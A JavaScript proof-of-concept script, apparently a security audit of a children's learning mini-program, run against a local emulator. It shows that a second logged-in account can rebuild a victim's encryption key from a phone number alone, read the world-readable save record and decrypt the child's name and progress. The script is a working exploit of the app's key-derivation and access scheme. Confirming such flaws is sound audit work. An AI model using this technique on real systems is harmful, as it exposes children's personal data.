/* Skeptic airtight: a logged-in attacker, knowing ONLY a victim's phone number, reads the
 * world-readable hansen_saves ciphertext and AES-GCM-decrypts it to the child's name + progress. */
import crypto from 'node:crypto';
import * as H from '/home/user/wordminiprogram/cloudbase_e2e_harness.mjs';
const READY = () => !!(window.HansenAuth && window.HansenCloudSave && window.HansenSbProfile && window.HansenBackup);
const j = (x) => JSON.stringify(x);
const ALPHABET = '0123456789ABCDEFGHJKMNPQRSTVWXYZ';
function keyFromUid(uid){ let h1=0x811c9dc5,h2=0x01000193,s='HSNACCT:'+uid;
  for(let i=0;i<s.length;i++){h1=((h1^s.charCodeAt(i))>>>0)*16777619>>>0;h2=((h2+s.charCodeAt(i)*(i+7))>>>0)*2654435761>>>0;}
  let o='';for(let j=0;j<16;j++){h1=(h1*1664525+1013904223)>>>0;h2=(h2^(h1>>>13))>>>0;o+=ALPHABET.charAt(((h1^h2)>>>0)%ALPHABET.length);}return o; }
const sha=(s)=>crypto.createHash('sha256').update(s).digest();
const srv = await H.startStatic(); const browser = await H.launchBrowser();
try {
  const emu = H.makeEmulator({ knobs: { permissionMode:'legacy', latencyMs:20, jitterMs:10, verificationCode:'123456' } });
  const PHONE = '13800138077';
  // Victim: phone login, set a telltale name, upload a real cloud save
  const A = await H.openPhone(browser, emu, srv.origin, { name:'A', ready: READY });
  await A.eval(() => window.HansenSbProfile.setName('王小明'));
  const la = await H.loginPhone(A, PHONE, '123456');
  const up = await A.eval(async () => { try { localStorage.setItem('wordIsland_farm', JSON.stringify({learned:[0,1,2,3,4],stars:3})); return await window.HansenCloudSave.syncNow({ force:true }); } catch(e){ return {err:String(e&&e.message||e)}; } });
  console.log('[victim] phone-login ok=%s  upload=%s', la.ok, j(up));
  // Attacker: a DIFFERENT logged-in account; knows ONLY the phone number
  emu.seedUser({ username:'mallory', password:'pw123456' });
  const C = await H.openPhone(browser, emu, srv.origin, { name:'C', ready: READY });
  await H.loginPassword(C, 'mallory', 'pw123456');
  const accKey = keyFromUid('p:'+PHONE);                // == normalizeKey(keyFromUid('p:'+phone)) (no hyphens)
  const docId  = sha('hansen-doc-v1:'+accKey).toString('hex');
  const env = await C.eval(async (docId) => {           // read the world-readable ciphertext
    const db = (await window.HansenAuth._app()).database();
    const r = await db.collection('hansen_saves').doc(docId).get();
    const row = r && r.data && (Array.isArray(r.data)?r.data[0]:r.data);
    return row && row.payload ? { iv: row.payload.iv, ct: row.payload.ct } : { none:true, raw:JSON.stringify(r).slice(0,120) };
  }, docId);
  console.log("[attacker] up=",j(up)," env=",j(env));
  if (env.none) { console.log('RESULT: could not locate save by phone-derived docId'); }
  else {
    const akey = crypto.createHash('sha256').update('hansen-aes-v1:'+accKey).digest();
    const ivb = Buffer.from(env.iv, 'base64'); const ctb = Buffer.from(env.ct, 'base64');
    const tag = ctb.subarray(ctb.length-16); const data = ctb.subarray(0, ctb.length-16);
    const dec = crypto.createDecipheriv('aes-256-gcm', akey, ivb); dec.setAuthTag(tag);
    const pt = Buffer.concat([dec.update(data), dec.final()]).toString('utf8');
    let inner = pt;
    try { inner = Buffer.from(pt, 'base64').toString('utf8'); } catch(e){}
    const nameHit = (inner.indexOf('王小明')>=0) ? inner.indexOf('王小明') : pt.indexOf('王小明');
    const hay = (inner.indexOf('王小明')>=0) ? inner : pt;
    console.log('[attacker] DECRYPTED plaintext bytes =', pt.length, ' contains victim name 王小明 =', nameHit>=0);
    console.log('           sample:', hay.slice(Math.max(0,nameHit-12), nameHit+24).replace(/\s+/g,' '));
    console.log(nameHit>=0 ? 'CONFIRMED: phone number alone -> child name + progress decrypted' : 'decrypt ok but name not found');
  }
  await A.close(); await C.close();
} finally { await browser.close().catch(()=>{}); srv.close(); }
